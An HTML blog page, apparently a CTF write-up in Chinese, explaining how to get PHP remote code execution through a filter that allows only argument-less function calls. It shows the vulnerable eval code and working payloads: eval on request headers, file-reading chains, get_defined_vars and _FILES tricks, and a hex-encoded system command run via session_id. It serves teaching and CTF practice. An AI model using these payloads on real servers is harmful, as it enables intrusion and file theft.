@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>PHP无参数RCE | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">PHP无参数RCE</h2>
+            <div class="post-date">2020-01-02</div>
+            
+            <div class="post-content">
+              <p>什么是无参数RCE，也就是不加参数只调用函数。远程执行代码</p>
+<!-- more -->
+<pre><code>if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
+    eval($_GET['code']);
+}
+</code></pre>
+<p>当有如上类型的过滤时，只允许执行a(b())这种类型的函数。只要带参数就拦截<br>
+方法一：<br>
+getallheaders()<br>
+#Apache中间件特有的函数<br>
+这个函数会以数组方式返回HTTP请求头的信息，如下</p>
+<pre><code>array(8) { 
+    [&quot;Host&quot;]=&gt; string(14) &quot;106.14.114.127&quot; 
+    [&quot;Connection&quot;]=&gt; string(10) &quot;keep-alive&quot; 
+    [&quot;Cache-Control&quot;]=&gt; string(9) &quot;max-age=0&quot; 
+    [&quot;Upgrade-Insecure-Requests&quot;]=&gt; string(1) &quot;1&quot; 
+    [&quot;User-Agent&quot;]=&gt; string(120) &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&quot; 
+    [&quot;Accept&quot;]=&gt; string(118) &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;
+     [&quot;Accept-Encoding&quot;]=&gt; string(13) &quot;gzip, deflate&quot; [&quot;Accept-Language&quot;]=&gt; string(14) &quot;zh-CN,zh;q=0.9&quot; 
+}
+</code></pre>
+<p>我们可以用eval(end(getallheaders()))<br>
+使用end函数取出请求头中的最后一位。然后放入eval函数。造成代码执行<br>
+<img src="https://guokeya.github.io/post-images/1577953838112.png" alt="" loading="lazy"><br>
+方法二：<br>
+构造函数读文件等<br>
+通过php函数互相调用。构造读文件的函数<br>
+getcwd()<br>
+#返回当前路径/var/www/html<br>
+scandir()<br>
+#目录遍历<br>
+scandir(getcwd())<br>
+#相当于ls /var/www/html<br>
+dirname()<br>
+#返回绝对路径中的文件夹部分，比如/var/www/html，返回/var/www<br>
+那么我们就可以构造<br>
+scandir(dirname(getcwd()))<br>
+#查看/var/www的文件<br>
+scandir(dirname(dirname(getcwd())))<br>
+#查看/var下的文件<br>
+最后用<br>
+end()返回数组中的最后一个单元<br>
+reset()返回数组中的第一个单元<br>
+array_reverse()将数组反过来<br>
+next()返回数组中的下一个单元<br>
+获取对应的字符串<br>
+然后readfile()读取<br>
+能执行到什么程度。全看PHP函数的熟练度<br>
+方法三：<br>
+使用get_defined_vars()函数。由于getallheaders()函数有局限性。这里使用get_defined_vars函数<br>
+返回已知变量的数组<br>
+返回结果如下</p>
+<pre><code>array(4) {
+  [&quot;_GET&quot;]=&gt;
+  array(1) {
+    [&quot;a&quot;]=&gt;
+    string(29) &quot;var_dump(get_defined_vars());&quot;
+  }
+  [&quot;_POST&quot;]=&gt;
+  array(0) {
+  }
+  [&quot;_COOKIE&quot;]=&gt;
+  array(0) {
+  }
+  [&quot;_FILES&quot;]=&gt;
+  array(0) {
+  }
+}
+</code></pre>
+<p>当我们传入另外一个参数b=1时,返回如下</p>
+<pre><code>array(4) {
+  [&quot;_GET&quot;]=&gt;
+  array(2) {
+    [&quot;a&quot;]=&gt;
+    string(29) &quot;var_dump(get_defined_vars());&quot;
+    [&quot;b&quot;]=&gt;
+    string(1) &quot;1&quot;
+  }
+  [&quot;_POST&quot;]=&gt;
+  array(0) {
+  }
+  [&quot;_COOKIE&quot;]=&gt;
+  array(0) {
+  }
+  [&quot;_FILES&quot;]=&gt;
+  array(0) {
+  }
+}
+</code></pre>
+<p>执行current(get_defined_vars())，返回</p>
+<pre><code>array(2) {
+  [&quot;a&quot;]=&gt;
+  string(38) &quot;var_dump(current(get_defined_vars()));&quot;
+  [&quot;b&quot;]=&gt;
+  string(1) &quot;1&quot;
+}
+</code></pre>
+<p>OK。这里返回了两个对应数组。一个A。一个B。如果我们使用上面结束的end函数等。获取了b的值。是不是就能直接RCE，我在Centos环境下就不能返回当前数组。Windows就可以。。。看具体情况吧<br>
+<img src="https://guokeya.github.io/post-images/1577953890243.png" alt="" loading="lazy"><br>
+当然还能利用FILES文件上传来RCE<br>
+array_reverse(get_defined_vars())<br>
+返回如下,通过将get_defined_vars()逆序然后使得files在第二个位置。就能通过next函数去调用</p>
+<pre><code>array(5) {
+  [&quot;_REQUEST&quot;]=&gt;
+  array(1) {
+    [&quot;a&quot;]=&gt;
+    string(44) &quot;var_dump(array_reverse(get_defined_vars()));&quot;
+  }
+  [&quot;_FILES&quot;]=&gt;
+  array(1) {
+    [&quot;73797374656d28276c73202f746d702729&quot;]=&gt;
+    array(5) {
+      [&quot;name&quot;]=&gt;
+      string(34) &quot;73797374656d28276c73202f746d702729&quot;
+      [&quot;type&quot;]=&gt;
+      string(0) &quot;&quot;
+      [&quot;tmp_name&quot;]=&gt;
+      string(22) &quot;C:\Windows\phpB8B8.tmp&quot;
+      [&quot;error&quot;]=&gt;
+      int(0)
+      [&quot;size&quot;]=&gt;
+      int(12)
+    }
+  }
+  [&quot;_COOKIE&quot;]=&gt;
+  array(0) {
+  }
+  [&quot;_POST&quot;]=&gt;
+  array(0) {
+  }
+  [&quot;_GET&quot;]=&gt;
+  array(1) {
+    [&quot;a&quot;]=&gt;
+    string(44) &quot;var_dump(array_reverse(get_defined_vars()));&quot;
+  }
+}
+</code></pre>
+<p>next(array_reverse(get_defined_vars()))</p>
+<pre><code>array(1) {
+  [&quot;73797374656d28276c73202f746d702729&quot;]=&gt;
+  array(5) {
+    [&quot;name&quot;]=&gt;
+    string(34) &quot;73797374656d28276c73202f746d702729&quot;
+    [&quot;type&quot;]=&gt;
+    string(0) &quot;&quot;
+    [&quot;tmp_name&quot;]=&gt;
+    string(22) &quot;C:\Windows\php5131.tmp&quot;
+    [&quot;error&quot;]=&gt;
+    int(0)
+    [&quot;size&quot;]=&gt;
+    int(12)
+  }
+}
+</code></pre>
+<p>解析来就继续获取，直到获取到我们命令的16进制<br>
+array_rand(next(array_reverse(get_defined_vars())))</p>
+<pre><code>string(34) &quot;73797374656d28276c73202f746d702729&quot;
+</code></pre>
+<p>获取成功。接下来就不用讲了。hex2bin解码。eval直接执行。实现无参数RCE，以下是Python脚本<br>
+<img src="https://guokeya.github.io/post-images/1577953952369.png" alt="" loading="lazy"><br>
+当然还能利用SESSION<br>
+code=eval(hex2bin(session_id(session_start())));<br>
+session_id(session_start())会返回sessionid中的值。<br>
+<img src="https://guokeya.github.io/post-images/1577953966331.png" alt="" loading="lazy"></p>
+<pre><code>然后利用hex2bin解码我们提交的16进制字符串。然后放入eval执行
+这里为什么用16进制呢。因为session只能由A-Z，a-z,0-9组成。而eval函数需要;结尾。所以用16进制提交
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1577953978267.png" alt="" loading="lazy"><br>
+网上一些其他的无参数payload：<br>
+print_r(highlight_file(next(array_reverse(scandir(pos(localeconv()))))));<br>
+var_dump(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(pos(localtime(time()))))))))))))));</p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/CTF/" class="tag">
+                    CTF
+                  </a>
+                
+                  <a href="https://guokeya.github.io/tag/Web/" class="tag">
+                    Web安全
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/EeULI1N2K/">
+                  <h3 class="post-title">
+                    Python Flask SSTI模板注入
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
